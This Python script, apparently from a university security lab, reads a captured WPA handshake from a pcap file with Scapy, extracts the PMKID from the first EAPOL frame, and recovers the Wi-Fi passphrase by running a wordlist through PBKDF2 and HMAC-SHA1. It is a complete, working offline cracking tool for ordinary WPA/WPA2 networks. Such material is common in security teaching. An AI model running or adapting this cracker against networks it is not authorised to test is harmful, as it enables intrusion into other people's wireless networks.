#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake infomamba

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Abraham Rubinstein et Yann Lederrey"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

import sys
import hmac, hashlib
from binascii import a2b_hex
from tqdm.rich import tqdm
from pbkdf2 import *
from scapy.all import *


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b""
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(
            key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1
        )
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]

def get_handshake_params(pcap_file: str, ap_mac_prefix: str):
  """Grab the handshake parameters from a pcap file and an AP MAC prefix. If no AP MAC prefix is provided, the first handshake found in the pcap will be used.

  Args:
      pcap_file (str): The path to the pcap file
      ap_mac_prefix (str): The AP MAC prefix we want to crack

  Returns:
      str: SSID
      bytes: AP MAC
      bytes: Client MAC
      bytes: PMKID
  """

  capture = rdpcap(pcap_file)

  # Check for start of handshake
  for i in range(0, len(capture)):
      if capture[i].type == 2 and capture[i].subtype == 8:
          try:
              if capture[i][EAPOL].type == 3:
                  # Check if it is the first packet of the 4-way handshake based on the message info number
                  to_ds = capture[i].FCfield & 0b01 != 0

                  # Identify the direction of the message (client -> AP or AP -> client)
                  if to_ds:
                      continue
                      
                  if (ap_mac_prefix == ""):
                      print("No AP MAC prefix provided, the first handshake found in the pcap will be used")
                      break

                  # Check MAC of the AP to keep only the 4-way handshake related to the AP we want to crack
                  if str(capture[i].addr2).startswith(ap_mac_prefix):
                      break

          except:
              pass
  else:
      print("No 4-way handshake found")
      exit(-1)

  # Get the PMKID
  pmkid = capture[i].original[-20:-4]

  # Get the AP and Client MAC addresses
  ap_mac_prefix = a2b_hex(capture[i].addr2.replace(":", ""))
  client_mac = a2b_hex(capture[i].addr1.replace(":", ""))

  # Get the SSID by checking the beacon frames before the handshake and looking for the same AP MAC address
  for j in range(0, i):
      # Check if it is a beacon frame
      if capture[j].type == 0 and capture[j].subtype == 8:
          # Check if the beacon frame is from the same AP as the 4-way handshake
          if str(capture[j].addr2).replace(":", "") == ap_mac_prefix.hex():
              ssid = capture[j].info.decode("utf-8")
              break
  else:
      print("No beacon frame found")
      exit(-1)
  return ssid, ap_mac_prefix, client_mac, pmkid

def crack_pmkid(ssid: str, ap_mac: bytes, client_mac: bytes, pmkid: bytes, wordlist_file: str):
  temp_stderr = sys.stderr
  print("Reading wordlist...")
  num_lines = sum(1 for line in open(wordlist_file, "r"))

  with open(wordlist_file, "r") as wordlist:
      print("Cracking passphrase for SSID:", ssid, "...")
      ssid = ssid.encode()
      sys.stderr = open(os.devnull, "w")
      for passphrase in tqdm(wordlist, total=num_lines):
          PMK = pbkdf2(hashlib.sha1, str.encode(passphrase.replace("\n", "")), ssid, 4096, 32)

          data = b"PMK Name" + ap_mac + client_mac
          PMKID = hmac.new(PMK, data, hashlib.sha1)

          hexdigest = PMKID.hexdigest()[:-8]
          pmkidHex = pmkid.hex()

          if pmkidHex == hexdigest:
              break
      else:
          print("No passphrase found")
          exit(-1)
      
      print("\n\tFound passphrase: ", passphrase)
      sys.stderr = temp_stderr

if __name__ == "__main__":  
  crack_pmkid(*get_handshake_params("PMKID_handshake.pcap", "90:4d:4a"), "wordlist.txt")